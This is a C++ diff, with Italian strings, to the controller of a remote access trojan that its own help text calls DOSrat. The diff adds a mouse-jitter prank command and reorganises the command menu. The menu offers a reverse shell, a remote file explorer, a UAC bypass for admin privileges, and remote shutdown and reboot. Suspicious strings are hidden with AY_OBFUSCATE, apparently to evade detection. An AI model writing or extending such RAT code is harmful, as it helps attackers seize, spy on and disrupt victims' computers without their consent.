@@ -423,7 +423,7 @@ bool InvertMouse(SOCKET Sock, int ID)
 {
     string Status;
 
-    Status = COMUNICAZIONI::InvertMouse(Sock);
+    Status = COMUNICAZIONI::PingPong(Sock, "invertmouse");
 
     if (Status == "a")
         cout << "Tasti invertiti." << endl;
@@ -466,10 +466,8 @@ bool Shutdown(SOCKET Sock, int ID)
 {
     if (COMUNICAZIONI::Shutdown(Sock))
     {
-        Sleep(1000);
-        closesocket(Sock);
-        Clients[ID].IsConnected = false;
-        Clu->AggiornaTitolo();
+        cout << "Comando lanciato" << endl;
+        Sleep(1500);
         return true;
     }
 
@@ -480,10 +478,8 @@ bool Reboot(SOCKET Sock, int ID)
 {
     if (COMUNICAZIONI::Reboot(Sock))
     {
-        Sleep(1000);
-        closesocket(Sock);
-        Clients[ID].IsConnected = false;
-        Clu->AggiornaTitolo();
+        cout << "Comando lanciato" << endl;
+        Sleep(1500);
         return true;
     }
 
@@ -1250,6 +1246,22 @@ short BypassUAC(SOCKET Sock, int ID)
 	return 2;	
 }
 
+bool VibeMouse(SOCKET Sock, int ID)
+{
+    string Status;
+
+    Status = COMUNICAZIONI::PingPong(Sock, "vibemouse");
+
+    if (Status == "a")
+        cout << "Vibrazione attivata." << endl;
+    else if (Status == "b")
+        cout << "Vibrazione disattivata." << endl;
+    else
+        return false;
+
+    return true;
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
     CLInterface cli;
@@ -1274,32 +1286,29 @@ void Sessione(int ID, SOCKET Sock)
             cout << endl;
             cli.SubTitle("Client", 30, tc.Blue);
             StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
-            StampaHelp("Killclient\t", "- Termina il processo del Client.");
-            cout << char(192) << char(196) << "Kill" << endl;
-            StampaHelp("Updateclient\t", "- Aggiorna il Client con un eseguibile locale.");
-            cout << char(192) << char(196) << "Update" << endl;
+            StampaHelp("Kill\t\t", "- Termina il processo del Client.");
+            StampaHelp("Update\t\t", "- Aggiorna il Client con un eseguibile locale.");
             StampaHelp("Uninstall\t", "- Disinstalla il Client dal PC remoto.");
-            StampaHelp("Restartclient\t", "- Termina il Client e lo riavvia.");
-            cout << char(192) << char(196) << "Restart" << endl;
+            StampaHelp("Restart\t\t", "- Termina il Client e lo riavvia.");
             cout << endl;
 
             cli.SubTitle("System", 30, tc.Lime);
             StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
-            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
             StampaHelp("Shutdown\t", "- Spegne il PC.");
             StampaHelp("Reboot\t\t", "- Riavvia il PC.");
-			StampaHelp((string)AY_OBFUSCATE("Reverseshell\t"), "- Lancia comandi sulla shell del PC remoto.");
-            cout << char(192) << char(196) << "Revshell" << endl;
-            StampaHelp("Filexplorer\t", "- Gestisci i file del PC remoto.");
-            cout << char(192) << char(196) << "explorer" << endl;
+			StampaHelp((string)AY_OBFUSCATE("Revshell\t"), "- Lancia comandi sulla shell del PC remoto.");
+            StampaHelp("Explorer\t", "- Gestisci i file del PC remoto.");
 			StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
+            cout << endl;
+
+            cli.SubTitle("Fun", 30, tc.Yellow);
+            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
+            StampaHelp("Vibemouse\t", "- Fa vibrare il puntatore del mouse.");
             cout << endl;
 
             cli.SubTitle("Utility", 30, tc.Purple);
             StampaHelp("Exit\t", "- Torna al menu principale.");
-            cout << char(192) << char(196) << "Close" << endl;
             StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
-            cout << char(192) << char(196) << "Cls" << endl;
             StampaHelp("Help\t", "- Mostra la lista dei comandi.");
             cout << endl;
         }
@@ -1330,7 +1339,7 @@ void Sessione(int ID, SOCKET Sock)
             StampaTitolo(1);
             cli.SubTitle("Sessione Comandi", 60, tc.Green);
         }
-        else if (cmd == "killclient" || cmd == "kill")
+        else if (cmd == "kill")
         {
             if (!KillClient(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
@@ -1351,7 +1360,7 @@ void Sessione(int ID, SOCKET Sock)
             else
                 Controllo = false;
         }
-        else if (cmd == "updateclient" || cmd == "update")
+        else if (cmd == "update")
         {
             switch (UpdateClient(Sock, ID))
             {
@@ -1367,19 +1376,19 @@ void Sessione(int ID, SOCKET Sock)
             else
                 Controllo = false;
         }
-        else if (cmd == "restartclient" || cmd == "restart")
+        else if (cmd == "restart")
         {
             if (!RestartClient(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
         }
-        else if (cmd == (string)AY_OBFUSCATE("reverseshell") || cmd == "revshell")
+        else if (cmd == (string)AY_OBFUSCATE("revshell"))
         {
             if (!ReverseShell(Sock))
                 Controllo = CheckConnection(Sock, ID);
         }
-        else if (cmd == "filexplorer" || cmd == "explorer")
+        else if (cmd == "explorer")
         {
             if (Clients[ID].info.CompatibleVer < 1)
                 StampaIncompatibile();
@@ -1430,6 +1439,16 @@ void Sessione(int ID, SOCKET Sock)
 				    }
 			}
 		}
+        else if (cmd == "vibemouse")
+        {
+            if (Clients[ID].info.CompatibleVer < 3)
+                StampaIncompatibile();
+            else
+            {
+                if (!VibeMouse(Sock, ID))
+                    Controllo = CheckConnection(Sock, ID);
+            }
+        }
         else
         {
             cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
